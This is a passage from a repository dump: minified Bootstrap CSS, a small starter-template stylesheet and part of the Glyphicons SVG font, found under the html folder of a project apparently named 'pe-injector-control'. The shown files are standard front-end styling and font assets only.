and (transform-3d),(-webkit-transform-3d){.carousel-inner>.item{-webkit-transition:-webkit-transform .6s ease-in-out;-o-transition:-o-transform .6s ease-in-out;transition:transform .6s ease-in-out;-webkit-backface-visibility:hidden;backface-visibility:hidden;-webkit-perspective:1000;perspective:1000}.carousel-inner>.item.active.right,.carousel-inner>.item.next{left:0;-webkit-transform:translate3d(100%,0,0);transform:translate3d(100%,0,0)}.carousel-inner>.item.active.left,.carousel-inner>.item.prev{left:0;-webkit-transform:translate3d(-100%,0,0);transform:translate3d(-100%,0,0)}.carousel-inner>.item.active,.carousel-inner>.item.next.left,.carousel-inner>.item.prev.right{left:0;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}}.carousel-inner>.active,.carousel-inner>.next,.carousel-inner>.prev{display:block}.carousel-inner>.active{left:0}.carousel-inner>.next,.carousel-inner>.prev{position:absolute;top:0;width:100%}.carousel-inner>.next{left:100%}.carousel-inner>.prev{left:-100%}.carousel-inner>.next.left,.carousel-inner>.prev.right{left:0}.carousel-inner>.active.left{left:-100%}.carousel-inner>.active.right{left:100%}.carousel-control{position:absolute;top:0;bottom:0;left:0;width:15%;font-size:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6);filter:alpha(opacity=50);opacity:.5}.carousel-control.left{background-image:-webkit-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:-webkit-gradient(linear,left top,right top,from(rgba(0,0,0,.5)),to(rgba(0,0,0,.0001)));background-image:linear-gradient(to right,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);background-repeat:repeat-x}.carousel-control.right{right:0;left:auto;background-image:-webkit-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:-webkit-gradient(linear,left top,right top,from(rgba(0,0,0,.0001)),to(rgba(0,0,0,.5)));background-image:linear-gradient(to right,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);background-repeat:repeat-x}.carousel-control:focus,.carousel-control:hover{color:#fff;text-decoration:none;filter:alpha(opacity=90);outline:0;opacity:.9}.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{position:absolute;top:50%;z-index:5;display:inline-block}.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{left:50%;margin-left:-10px}.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{right:50%;margin-right:-10px}.carousel-control .icon-next,.carousel-control .icon-prev{width:20px;height:20px;margin-top:-10px;font-family:serif;line-height:1}.carousel-control .icon-prev:before{content:'\2039'}.carousel-control .icon-next:before{content:'\203a'}.carousel-indicators{position:absolute;bottom:10px;left:50%;z-index:15;width:60%;padding-left:0;margin-left:-30%;text-align:center;list-style:none}.carousel-indicators li{display:inline-block;width:10px;height:10px;margin:1px;text-indent:-999px;cursor:pointer;background-color:#000 \9;background-color:rgba(0,0,0,0);border:1px solid #fff;border-radius:10px}.carousel-indicators .active{width:12px;height:12px;margin:0;background-color:#fff}.carousel-caption{position:absolute;right:15%;bottom:20px;left:15%;z-index:10;padding-top:20px;padding-bottom:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6)}.carousel-caption .btn{text-shadow:none}@media screen and (min-width:768px){.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{width:30px;height:30px;margin-top:-15px;font-size:30px}.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{margin-left:-15px}.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{margin-right:-15px}.carousel-caption{right:20%;left:20%;padding-bottom:30px}.carousel-indicators{bottom:20px}}.btn-group-vertical>.btn-group:after,.btn-group-vertical>.btn-group:before,.btn-toolbar:after,.btn-toolbar:before,.clearfix:after,.clearfix:before,.container-fluid:after,.container-fluid:before,.container:after,.container:before,.dl-horizontal dd:after,.dl-horizontal dd:before,.form-horizontal .form-group:after,.form-horizontal .form-group:before,.modal-footer:after,.modal-footer:before,.nav:after,.nav:before,.navbar-collapse:after,.navbar-collapse:before,.navbar-header:after,.navbar-header:before,.navbar:after,.navbar:before,.pager:after,.pager:before,.panel-body:after,.panel-body:before,.row:after,.row:before{display:table;content:" "}.btn-group-vertical>.btn-group:after,.btn-toolbar:after,.clearfix:after,.container-fluid:after,.container:after,.dl-horizontal dd:after,.form-horizontal .form-group:after,.modal-footer:after,.nav:after,.navbar-collapse:after,.navbar-header:after,.navbar:after,.pager:after,.panel-body:after,.row:after{clear:both}.center-block{display:block;margin-right:auto;margin-left:auto}.pull-right{float:right!important}.pull-left{float:left!important}.hide{display:none!important}.show{display:block!important}.invisible{visibility:hidden}.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}.hidden{display:none!important}.affix{position:fixed}@-ms-viewport{width:device-width}.visible-lg,.visible-md,.visible-sm,.visible-xs{display:none!important}.visible-lg-block,.visible-lg-inline,.visible-lg-inline-block,.visible-md-block,.visible-md-inline,.visible-md-inline-block,.visible-sm-block,.visible-sm-inline,.visible-sm-inline-block,.visible-xs-block,.visible-xs-inline,.visible-xs-inline-block{display:none!important}@media (max-width:767px){.visible-xs{display:block!important}table.visible-xs{display:table}tr.visible-xs{display:table-row!important}td.visible-xs,th.visible-xs{display:table-cell!important}}@media (max-width:767px){.visible-xs-block{display:block!important}}@media (max-width:767px){.visible-xs-inline{display:inline!important}}@media (max-width:767px){.visible-xs-inline-block{display:inline-block!important}}@media (min-width:768px)and (max-width:991px){.visible-sm{display:block!important}table.visible-sm{display:table}tr.visible-sm{display:table-row!important}td.visible-sm,th.visible-sm{display:table-cell!important}}@media (min-width:768px)and (max-width:991px){.visible-sm-block{display:block!important}}@media (min-width:768px)and (max-width:991px){.visible-sm-inline{display:inline!important}}@media (min-width:768px)and (max-width:991px){.visible-sm-inline-block{display:inline-block!important}}@media (min-width:992px)and (max-width:1199px){.visible-md{display:block!important}table.visible-md{display:table}tr.visible-md{display:table-row!important}td.visible-md,th.visible-md{display:table-cell!important}}@media (min-width:992px)and (max-width:1199px){.visible-md-block{display:block!important}}@media (min-width:992px)and (max-width:1199px){.visible-md-inline{display:inline!important}}@media (min-width:992px)and (max-width:1199px){.visible-md-inline-block{display:inline-block!important}}@media (min-width:1200px){.visible-lg{display:block!important}table.visible-lg{display:table}tr.visible-lg{display:table-row!important}td.visible-lg,th.visible-lg{display:table-cell!important}}@media (min-width:1200px){.visible-lg-block{display:block!important}}@media (min-width:1200px){.visible-lg-inline{display:inline!important}}@media (min-width:1200px){.visible-lg-inline-block{display:inline-block!important}}@media (max-width:767px){.hidden-xs{display:none!important}}@media (min-width:768px)and (max-width:991px){.hidden-sm{display:none!important}}@media (min-width:992px)and (max-width:1199px){.hidden-md{display:none!important}}@media (min-width:1200px){.hidden-lg{display:none!important}}.visible-print{display:none!important}@media print{.visible-print{display:block!important}table.visible-print{display:table}tr.visible-print{display:table-row!important}td.visible-print,th.visible-print{display:table-cell!important}}.visible-print-block{display:none!important}@media print{.visible-print-block{display:block!important}}.visible-print-inline{display:none!important}@media print{.visible-print-inline{display:inline!important}}.visible-print-inline-block{display:none!important}@media print{.visible-print-inline-block{display:inline-block!important}}@media print{.hidden-print{display:none!important}}
```

`pe-injector-control/html/css/starter-template.css`:

```css
body {
  padding-top: 50px;
}
.starter-template {
  padding: 20px 15px;
  text-align: center;
}

```

`pe-injector-control/html/fonts/glyphicons-halflings-regular.svg`:

```svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" >
<svg xmlns="http://www.w3.org/2000/svg">
<metadata></metadata>
<defs>
<font id="glyphicons_halflingsregular" horiz-adv-x="1200" >
<font-face units-per-em="1200" ascent="960" descent="-240" />
<missing-glyph horiz-adv-x="500" />
<glyph horiz-adv-x="0" />
<glyph horiz-adv-x="400" />
<glyph unicode=" " />
<glyph unicode="*" d="M600 1100q15 0 34 -1.5t30 -3.5l11 -1q10 -2 17.5 -10.5t7.5 -18.5v-224l158 158q7 7 18 8t19 -6l106 -106q7 -8 6 -19t-8 -18l-158 -158h224q10 0 18.5 -7.5t10.5 -17.5q6 -41 6 -75q0 -15 -1.5 -34t-3.5 -30l-1 -11q-2 -10 -10.5 -17.5t-18.5 -7.5h-224l158 -158 q7 -7 8 -18t-6 -19l-106 -106q-8 -7 -19 -6t-18 8l-158 158v-224q0 -10 -7.5 -18.5t-17.5 -10.5q-41 -6 -75 -6q-15 0 -34 1.5t-30 3.5l-11 1q-10 2 -17.5 10.5t-7.5 18.5v224l-158 -158q-7 -7 -18 -8t-19 6l-106 106q-7 8 -6 19t8 18l158 158h-224q-10 0 -18.5 7.5 t-10.5 17.5q-6 41 -6 75q0 15 1.5 34t3.5 30l1 11q2 10 10.5 17.5t18.5 7.5h224l-158 158q-7 7 -8 18t6 19l106 106q8 7 19 6t18 -8l158 -158v224q0 10 7.5 18.5t17.5 10.5q41 6 75 6z" />
<glyph unicode="+" d="M450 1100h200q21 0 35.5 -14.5t14.5 -35.5v-350h350q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-350v-350q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v350h-350q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5 h350v350q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xa0;" />
<glyph unicode="&#xa5;" d="M825 1100h250q10 0 12.5 -5t-5.5 -13l-364 -364q-6 -6 -11 -18h268q10 0 13 -6t-3 -14l-120 -160q-6 -8 -18 -14t-22 -6h-125v-100h275q10 0 13 -6t-3 -14l-120 -160q-6 -8 -18 -14t-22 -6h-125v-174q0 -11 -7.5 -18.5t-18.5 -7.5h-148q-11 0 -18.5 7.5t-7.5 18.5v174 h-275q-10 0 -13 6t3 14l120 160q6 8 18 14t22 6h125v100h-275q-10 0 -13 6t3 14l120 160q6 8 18 14t22 6h118q-5 12 -11 18l-364 364q-8 8 -5.5 13t12.5 5h250q25 0 43 -18l164 -164q8 -8 18 -8t18 8l164 164q18 18 43 18z" />
<glyph unicode="&#x2000;" horiz-adv-x="650" />
<glyph unicode="&#x2001;" horiz-adv-x="1300" />
<glyph unicode="&#x2002;" horiz-adv-x="650" />
<glyph unicode="&#x2003;" horiz-adv-x="1300" />
<glyph unicode="&#x2004;" horiz-adv-x="433" />
<glyph unicode="&#x2005;" horiz-adv-x="325" />
<glyph unicode="&#x2006;" horiz-adv-x="216" />
<glyph unicode="&#x2007;" horiz-adv-x="216" />
<glyph unicode="&#x2008;" horiz-adv-x="162" />
<glyph unicode="&#x2009;" horiz-adv-x="260" />
<glyph unicode="&#x200a;" horiz-adv-x="72" />
<glyph unicode="&#x202f;" horiz-adv-x="260" />
<glyph unicode="&#x205f;" horiz-adv-x="325" />
<glyph unicode="&#x20ac;" d="M744 1198q242 0 354 -189q60 -104 66 -209h-181q0 45 -17.5 82.5t-43.5 61.5t-58 40.5t-60.5 24t-51.5 7.5q-19 0 -40.5 -5.5t-49.5 -20.5t-53 -38t-49 -62.5t-39 -89.5h379l-100 -100h-300q-6 -50 -6 -100h406l-100 -100h-300q9 -74 33 -132t52.5 -91t61.5 -54.5t59 -29 t47 -7.5q22 0 50.5 7.5t60.5 24.5t58 41t43.5 61t17.5 80h174q-30 -171 -128 -278q-107 -117 -274 -117q-206 0 -324 158q-36 48 -69 133t-45 204h-217l100 100h112q1 47 6 100h-218l100 100h134q20 87 51 153.5t62 103.5q117 141 297 141z" />
<glyph unicode="&#x20bd;" d="M428 1200h350q67 0 120 -13t86 -31t57 -49.5t35 -56.5t17 -64.5t6.5 -60.5t0.5 -57v-16.5v-16.5q0 -36 -0.5 -57t-6.5 -61t-17 -65t-35 -57t-57 -50.5t-86 -31.5t-120 -13h-178l-2 -100h288q10 0 13 -6t-3 -14l-120 -160q-6 -8 -18 -14t-22 -6h-138v-175q0 -11 -5.5 -18 t-15.5 -7h-149q-10 0 -17.5 7.5t-7.5 17.5v175h-267q-10 0 -13 6t3 14l120 160q6 8 18 14t22 6h117v100h-267q-10 0 -13 6t3 14l120 160q6 8 18 14t22 6h117v475q0 10 7.5 17.5t17.5 7.5zM600 1000v-300h203q64 0 86.5 33t22.5 119q0 84 -22.5 116t-86.5 32h-203z" />
<glyph unicode="&#x2212;" d="M250 700h800q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#x231b;" d="M1000 1200v-150q0 -21 -14.5 -35.5t-35.5 -14.5h-50v-100q0 -91 -49.5 -165.5t-130.5 -109.5q81 -35 130.5 -109.5t49.5 -165.5v-150h50q21 0 35.5 -14.5t14.5 -35.5v-150h-800v150q0 21 14.5 35.5t35.5 14.5h50v150q0 91 49.5 165.5t130.5 109.5q-81 35 -130.5 109.5 t-49.5 165.5v100h-50q-21 0 -35.5 14.5t-14.5 35.5v150h800zM400 1000v-100q0 -60 32.5 -109.5t87.5 -73.5q28 -12 44 -37t16 -55t-16 -55t-44 -37q-55 -24 -87.5 -73.5t-32.5 -109.5v-150h400v150q0 60 -32.5 109.5t-87.5 73.5q-28 12 -44 37t-16 55t16 55t44 37 q55 24 87.5 73.5t32.5 109.5v100h-400z" />
<glyph unicode="&#x25fc;" horiz-adv-x="500" d="M0 0z" />
<glyph unicode="&#x2601;" d="M503 1089q110 0 200.5 -59.5t134.5 -156.5q44 14 90 14q120 0 205 -86.5t85 -206.5q0 -121 -85 -207.5t-205 -86.5h-750q-79 0 -135.5 57t-56.5 137q0 69 42.5 122.5t108.5 67.5q-2 12 -2 37q0 153 108 260.5t260 107.5z" />
<glyph unicode="&#x26fa;" d="M774 1193.5q16 -9.5 20.5 -27t-5.5 -33.5l-136 -187l467 -746h30q20 0 35 -18.5t15 -39.5v-42h-1200v42q0 21 15 39.5t35 18.5h30l468 746l-135 183q-10 16 -5.5 34t20.5 28t34 5.5t28 -20.5l111 -148l112 150q9 16 27 20.5t34 -5zM600 200h377l-182 112l-195 534v-646z " />
<glyph unicode="&#x2709;" d="M25 1100h1150q10 0 12.5 -5t-5.5 -13l-564 -567q-8 -8 -18 -8t-18 8l-564 567q-8 8 -5.5 13t12.5 5zM18 882l264 -264q8 -8 8 -18t-8 -18l-264 -264q-8 -8 -13 -5.5t-5 12.5v550q0 10 5 12.5t13 -5.5zM918 618l264 264q8 8 13 5.5t5 -12.5v-550q0 -10 -5 -12.5t-13 5.5 l-264 264q-8 8 -8 18t8 18zM818 482l364 -364q8 -8 5.5 -13t-12.5 -5h-1150q-10 0 -12.5 5t5.5 13l364 364q8 8 18 8t18 -8l164 -164q8 -8 18 -8t18 8l164 164q8 8 18 8t18 -8z" />
<glyph unicode="&#x270f;" d="M1011 1210q19 0 33 -13l153 -153q13 -14 13 -33t-13 -33l-99 -92l-214 214l95 96q13 14 32 14zM1013 800l-615 -614l-214 214l614 614zM317 96l-333 -112l110 335z" />
<glyph unicode="&#xe001;" d="M700 650v-550h250q21 0 35.5 -14.5t14.5 -35.5v-50h-800v50q0 21 14.5 35.5t35.5 14.5h250v550l-500 550h1200z" />
<glyph unicode="&#xe002;" d="M368 1017l645 163q39 15 63 0t24 -49v-831q0 -55 -41.5 -95.5t-111.5 -63.5q-79 -25 -147 -4.5t-86 75t25.5 111.5t122.5 82q72 24 138 8v521l-600 -155v-606q0 -42 -44 -90t-109 -69q-79 -26 -147 -5.5t-86 75.5t25.5 111.5t122.5 82.5q72 24 138 7v639q0 38 14.5 59 t53.5 34z" />
<glyph unicode="&#xe003;" d="M500 1191q100 0 191 -39t156.5 -104.5t104.5 -156.5t39 -191l-1 -2l1 -5q0 -141 -78 -262l275 -274q23 -26 22.5 -44.5t-22.5 -42.5l-59 -58q-26 -20 -46.5 -20t-39.5 20l-275 274q-119 -77 -261 -77l-5 1l-2 -1q-100 0 -191 39t-156.5 104.5t-104.5 156.5t-39 191 t39 191t104.5 156.5t156.5 104.5t191 39zM500 1022q-88 0 -162 -43t-117 -117t-43 -162t43 -162t117 -117t162 -43t162 43t117 117t43 162t-43 162t-117 117t-162 43z" />
<glyph unicode="&#xe005;" d="M649 949q48 68 109.5 104t121.5 38.5t118.5 -20t102.5 -64t71 -100.5t27 -123q0 -57 -33.5 -117.5t-94 -124.5t-126.5 -127.5t-150 -152.5t-146 -174q-62 85 -145.5 174t-150 152.5t-126.5 127.5t-93.5 124.5t-33.5 117.5q0 64 28 123t73 100.5t104 64t119 20 t120.5 -38.5t104.5 -104z" />
<glyph unicode="&#xe006;" d="M407 800l131 353q7 19 17.5 19t17.5 -19l129 -353h421q21 0 24 -8.5t-14 -20.5l-342 -249l130 -401q7 -20 -0.5 -25.5t-24.5 6.5l-343 246l-342 -247q-17 -12 -24.5 -6.5t-0.5 25.5l130 400l-347 251q-17 12 -14 20.5t23 8.5h429z" />
<glyph unicode="&#xe007;" d="M407 800l131 353q7 19 17.5 19t17.5 -19l129 -353h421q21 0 24 -8.5t-14 -20.5l-342 -249l130 -401q7 -20 -0.5 -25.5t-24.5 6.5l-343 246l-342 -247q-17 -12 -24.5 -6.5t-0.5 25.5l130 400l-347 251q-17 12 -14 20.5t23 8.5h429zM477 700h-240l197 -142l-74 -226 l193 139l195 -140l-74 229l192 140h-234l-78 211z" />
<glyph unicode="&#xe008;" d="M600 1200q124 0 212 -88t88 -212v-250q0 -46 -31 -98t-69 -52v-75q0 -10 6 -21.5t15 -17.5l358 -230q9 -5 15 -16.5t6 -21.5v-93q0 -10 -7.5 -17.5t-17.5 -7.5h-1150q-10 0 -17.5 7.5t-7.5 17.5v93q0 10 6 21.5t15 16.5l358 230q9 6 15 17.5t6 21.5v75q-38 0 -69 52 t-31 98v250q0 124 88 212t212 88z" />
<glyph unicode="&#xe009;" d="M25 1100h1150q10 0 17.5 -7.5t7.5 -17.5v-1050q0 -10 -7.5 -17.5t-17.5 -7.5h-1150q-10 0 -17.5 7.5t-7.5 17.5v1050q0 10 7.5 17.5t17.5 7.5zM100 1000v-100h100v100h-100zM875 1000h-550q-10 0 -17.5 -7.5t-7.5 -17.5v-350q0 -10 7.5 -17.5t17.5 -7.5h550 q10 0 17.5 7.5t7.5 17.5v350q0 10 -7.5 17.5t-17.5 7.5zM1000 1000v-100h100v100h-100zM100 800v-100h100v100h-100zM1000 800v-100h100v100h-100zM100 600v-100h100v100h-100zM1000 600v-100h100v100h-100zM875 500h-550q-10 0 -17.5 -7.5t-7.5 -17.5v-350q0 -10 7.5 -17.5 t17.5 -7.5h550q10 0 17.5 7.5t7.5 17.5v350q0 10 -7.5 17.5t-17.5 7.5zM100 400v-100h100v100h-100zM1000 400v-100h100v100h-100zM100 200v-100h100v100h-100zM1000 200v-100h100v100h-100z" />
<glyph unicode="&#xe010;" d="M50 1100h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM650 1100h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400 q0 21 14.5 35.5t35.5 14.5zM50 500h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM650 500h400q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-400 q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe011;" d="M50 1100h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 1100h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200 q0 21 14.5 35.5t35.5 14.5zM850 1100h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM50 700h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200 q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 700h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM850 700h200q21 0 35.5 -14.5t14.5 -35.5v-200 q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM50 300h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 300h200 q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM850 300h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5 t35.5 14.5z" />
<glyph unicode="&#xe012;" d="M50 1100h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 1100h700q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-700q-21 0 -35.5 14.5t-14.5 35.5v200 q0 21 14.5 35.5t35.5 14.5zM50 700h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 700h700q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-700 q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM50 300h200q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5zM450 300h700q21 0 35.5 -14.5t14.5 -35.5v-200 q0 -21 -14.5 -35.5t-35.5 -14.5h-700q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe013;" d="M465 477l571 571q8 8 18 8t17 -8l177 -177q8 -7 8 -17t-8 -18l-783 -784q-7 -8 -17.5 -8t-17.5 8l-384 384q-8 8 -8 18t8 17l177 177q7 8 17 8t18 -8l171 -171q7 -7 18 -7t18 7z" />
<glyph unicode="&#xe014;" d="M904 1083l178 -179q8 -8 8 -18.5t-8 -17.5l-267 -268l267 -268q8 -7 8 -17.5t-8 -18.5l-178 -178q-8 -8 -18.5 -8t-17.5 8l-268 267l-268 -267q-7 -8 -17.5 -8t-18.5 8l-178 178q-8 8 -8 18.5t8 17.5l267 268l-267 268q-8 7 -8 17.5t8 18.5l178 178q8 8 18.5 8t17.5 -8 l268 -267l268 268q7 7 17.5 7t18.5 -7z" />
<glyph unicode="&#xe015;" d="M507 1177q98 0 187.5 -38.5t154.5 -103.5t103.5 -154.5t38.5 -187.5q0 -141 -78 -262l300 -299q8 -8 8 -18.5t-8 -18.5l-109 -108q-7 -8 -17.5 -8t-18.5 8l-300 299q-119 -77 -261 -77q-98 0 -188 38.5t-154.5 103t-103 154.5t-38.5 188t38.5 187.5t103 154.5 t154.5 103.5t188 38.5zM506.5 1023q-89.5 0 -165.5 -44t-120 -120.5t-44 -166t44 -165.5t120 -120t165.5 -44t166 44t120.5 120t44 165.5t-44 166t-120.5 120.5t-166 44zM425 900h150q10 0 17.5 -7.5t7.5 -17.5v-75h75q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5 t-17.5 -7.5h-75v-75q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v75h-75q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5h75v75q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe016;" d="M507 1177q98 0 187.5 -38.5t154.5 -103.5t103.5 -154.5t38.5 -187.5q0 -141 -78 -262l300 -299q8 -8 8 -18.5t-8 -18.5l-109 -108q-7 -8 -17.5 -8t-18.5 8l-300 299q-119 -77 -261 -77q-98 0 -188 38.5t-154.5 103t-103 154.5t-38.5 188t38.5 187.5t103 154.5 t154.5 103.5t188 38.5zM506.5 1023q-89.5 0 -165.5 -44t-120 -120.5t-44 -166t44 -165.5t120 -120t165.5 -44t166 44t120.5 120t44 165.5t-44 166t-120.5 120.5t-166 44zM325 800h350q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-350q-10 0 -17.5 7.5 t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe017;" d="M550 1200h100q21 0 35.5 -14.5t14.5 -35.5v-400q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v400q0 21 14.5 35.5t35.5 14.5zM800 975v166q167 -62 272 -209.5t105 -331.5q0 -117 -45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5 t-184.5 123t-123 184.5t-45.5 224q0 184 105 331.5t272 209.5v-166q-103 -55 -165 -155t-62 -220q0 -116 57 -214.5t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5q0 120 -62 220t-165 155z" />
<glyph unicode="&#xe018;" d="M1025 1200h150q10 0 17.5 -7.5t7.5 -17.5v-1150q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v1150q0 10 7.5 17.5t17.5 7.5zM725 800h150q10 0 17.5 -7.5t7.5 -17.5v-750q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v750 q0 10 7.5 17.5t17.5 7.5zM425 500h150q10 0 17.5 -7.5t7.5 -17.5v-450q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v450q0 10 7.5 17.5t17.5 7.5zM125 300h150q10 0 17.5 -7.5t7.5 -17.5v-250q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5 v250q0 10 7.5 17.5t17.5 7.5z" />
<glyph unicode="&#xe019;" d="M600 1174q33 0 74 -5l38 -152l5 -1q49 -14 94 -39l5 -2l134 80q61 -48 104 -105l-80 -134l3 -5q25 -44 39 -93l1 -6l152 -38q5 -43 5 -73q0 -34 -5 -74l-152 -38l-1 -6q-15 -49 -39 -93l-3 -5l80 -134q-48 -61 -104 -105l-134 81l-5 -3q-44 -25 -94 -39l-5 -2l-38 -151 q-43 -5 -74 -5q-33 0 -74 5l-38 151l-5 2q-49 14 -94 39l-5 3l-134 -81q-60 48 -104 105l80 134l-3 5q-25 45 -38 93l-2 6l-151 38q-6 42 -6 74q0 33 6 73l151 38l2 6q13 48 38 93l3 5l-80 134q47 61 105 105l133 -80l5 2q45 25 94 39l5 1l38 152q43 5 74 5zM600 815 q-89 0 -152 -63t-63 -151.5t63 -151.5t152 -63t152 63t63 151.5t-63 151.5t-152 63z" />
<glyph unicode="&#xe020;" d="M500 1300h300q41 0 70.5 -29.5t29.5 -70.5v-100h275q10 0 17.5 -7.5t7.5 -17.5v-75h-1100v75q0 10 7.5 17.5t17.5 7.5h275v100q0 41 29.5 70.5t70.5 29.5zM500 1200v-100h300v100h-300zM1100 900v-800q0 -41 -29.5 -70.5t-70.5 -29.5h-700q-41 0 -70.5 29.5t-29.5 70.5 v800h900zM300 800v-700h100v700h-100zM500 800v-700h100v700h-100zM700 800v-700h100v700h-100zM900 800v-700h100v700h-100z" />
<glyph unicode="&#xe021;" d="M18 618l620 608q8 7 18.5 7t17.5 -7l608 -608q8 -8 5.5 -13t-12.5 -5h-175v-575q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v375h-300v-375q0 -10 -7.5 -17.5t-17.5 -7.5h-250q-10 0 -17.5 7.5t-7.5 17.5v575h-175q-10 0 -12.5 5t5.5 13z" />
